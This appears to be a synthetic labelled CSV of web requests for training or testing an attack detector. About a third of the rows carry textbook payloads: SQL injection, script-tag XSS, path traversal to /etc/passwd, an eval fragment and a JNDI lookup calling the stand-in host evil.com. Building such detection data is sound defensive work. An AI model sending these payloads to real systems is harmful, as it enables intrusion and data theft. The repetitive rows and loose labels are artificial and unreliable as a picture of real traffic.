request_method,url,payload,user_agent,response_code,is_attack
GET,/app/page1?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page3,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page29,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page11,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page53?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page85,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page16,,sqlmap/1.0,200,0
GET,/app/page63?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page67,,sqlmap/1.0,200,0
POST,/app/page55,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page54,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page36,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page23,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page71,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page86,,Nikto/2.1.6,200,0
POST,/app/page50?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page58,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page43,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page3,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page66,,sqlmap/1.0,200,0
GET,/app/page80?UNION SELECT * FROM users,UNION SELECT * FROM users,sqlmap/1.0,403,1
GET,/app/page94,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page50?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
DELETE,/app/page94?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page98?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page16?eval(String.fromCharCode(,eval(String.fromCharCode(,sqlmap/1.0,500,1
GET,/app/page42,,sqlmap/1.0,404,0
GET,/app/page67,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page32?../../../etc/passwd,../../../etc/passwd,sqlmap/1.0,500,1
GET,/app/page65,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page76,,sqlmap/1.0,200,0
POST,/app/page15,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page3,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page95,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page97,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page95,,Nikto/2.1.6,200,0
GET,/app/page59,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page5,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page60,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page8?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page64,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page93?<script>alert('xss')</script>,<script>alert('xss')</script>,Nikto/2.1.6,403,1
GET,/app/page6,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page32,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page45,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page33?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page79,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page84,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page43,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page25,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
PUT,/app/page99,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page24?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page69,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page53,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page92,,sqlmap/1.0,404,0
GET,/app/page95,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
GET,/app/page45,,sqlmap/1.0,200,0
GET,/app/page39,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page27?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page3,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page12,,sqlmap/1.0,200,0
GET,/app/page66?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
POST,/app/page43,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page2,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page89,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page76?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page58,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page61,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page80?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
GET,/app/page36?UNION SELECT * FROM users,UNION SELECT * FROM users,Nikto/2.1.6,500,1
GET,/app/page12,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page62?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (compatible; Baiduspider/2.0),404,1
GET,/app/page8,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page82,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page58,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page1,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page88,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
GET,/app/page9,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page10,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page31?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page26,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page82,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page4?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page83,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page53,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page36?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page68,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page59?' OR 1=1 --,' OR 1=1 --,sqlmap/1.0,403,1
POST,/app/page76,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page97,,Mozilla/5.0 (compatible; Baiduspider/2.0),403,0
POST,/app/page70,,sqlmap/1.0,500,0
GET,/app/page17,,Nikto/2.1.6,200,0
PUT,/app/page83?eval(String.fromCharCode(,eval(String.fromCharCode(,Nikto/2.1.6,500,1
GET,/app/page81,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
PUT,/app/page99,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page33,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page51,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page80?../../../etc/passwd,../../../etc/passwd,Nikto/2.1.6,403,1
GET,/app/page48?../../../etc/passwd,../../../etc/passwd,Nikto/2.1.6,403,1
GET,/app/page22?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page53,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page97?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page39,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page33?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page65,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page57,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page48,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page61?eval(String.fromCharCode(,eval(String.fromCharCode(,Nikto/2.1.6,500,1
GET,/app/page76?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page74?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page49,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page44,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
OPTIONS,/app/page23,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page34,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page7,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page21,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page51,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page22,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page21,,Nikto/2.1.6,200,0
GET,/app/page57,,Nikto/2.1.6,200,0
POST,/app/page25,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page79?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page46?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page33,,Nikto/2.1.6,200,0
GET,/app/page74,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page56?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
DELETE,/app/page7,,Nikto/2.1.6,200,0
GET,/app/page8,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page16?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
POST,/app/page79,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
PUT,/app/page4,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page31,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page41?' OR 1=1 --,' OR 1=1 --,sqlmap/1.0,403,1
GET,/app/page30?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page93,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page75,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page84?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page30,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page80,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page26?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page32,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page88?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page56?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page10?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page13?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page93?<script>alert('xss')</script>,<script>alert('xss')</script>,sqlmap/1.0,403,1
GET,/app/page16?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page66,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page87,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page44,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page71,,sqlmap/1.0,200,0
GET,/app/page10?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page98?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page37,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page17,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page28?<script>alert('xss')</script>,<script>alert('xss')</script>,sqlmap/1.0,403,1
DELETE,/app/page60?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page99?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page39?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page48?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page61,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page44,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page50?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page58,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page43,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page56,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
DELETE,/app/page14,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page12,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page98,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page44,,Nikto/2.1.6,403,0
GET,/app/page13,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page98?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (compatible; Baiduspider/2.0),404,1
OPTIONS,/app/page63,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
PUT,/app/page59,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
PUT,/app/page12?eval(String.fromCharCode(,eval(String.fromCharCode(,sqlmap/1.0,403,1
POST,/app/page42,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page49,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page99,,Nikto/2.1.6,200,0
GET,/app/page25,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page21,,sqlmap/1.0,200,0
GET,/app/page92?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page35,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page44,,sqlmap/1.0,404,0
PUT,/app/page48,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page76,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
PUT,/app/page4,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page13,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page1?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page38,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page97,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page52,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page27,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page93?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page2,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page99,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page71?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page76?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page99,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page54?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page78,,sqlmap/1.0,200,0
GET,/app/page18,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page74,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page22?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page51?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
GET,/app/page71,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page75?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page35,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page96,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page31,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
PUT,/app/page96,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page51,,sqlmap/1.0,200,0
GET,/app/page61,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page52,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page69?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,1
GET,/app/page27,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
PUT,/app/page52,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page17,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page16?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page52?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page50,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page39,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page55?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page99,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
PUT,/app/page89?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page20,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page22,,sqlmap/1.0,500,0
GET,/app/page69,,Nikto/2.1.6,404,0
GET,/app/page92?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page67,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page18?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
PUT,/app/page40,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page42,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page28,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page22?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page72,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
PUT,/app/page74,,sqlmap/1.0,200,0
PUT,/app/page31,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page12?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page40,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page99,,sqlmap/1.0,404,0
GET,/app/page52?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page51,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page20,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page97,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page80,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page18?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page93,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page39,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
PUT,/app/page49,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page73,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page54,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page58?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page88?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page38,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page48?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
OPTIONS,/app/page85,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page62?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page94?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page19,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page53,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
PUT,/app/page75,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page42,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page19?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
GET,/app/page40?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,1
GET,/app/page41,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page92?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page40,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page64?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page38,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page37,,Nikto/2.1.6,200,0
GET,/app/page63?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page63,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page59?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page44,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page71?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page9,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page4,,Nikto/2.1.6,200,0
PUT,/app/page36,,sqlmap/1.0,200,0
GET,/app/page89,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page39,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page81?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},sqlmap/1.0,403,1
GET,/app/page87?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page73?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page71,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
DELETE,/app/page43?../../../etc/passwd,../../../etc/passwd,Nikto/2.1.6,403,1
POST,/app/page75,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page57,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page24?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page15?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
POST,/app/page64,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page21,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page32?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page52?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Nikto/2.1.6,500,1
GET,/app/page64,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
GET,/app/page98,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page83,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page48,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page22,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
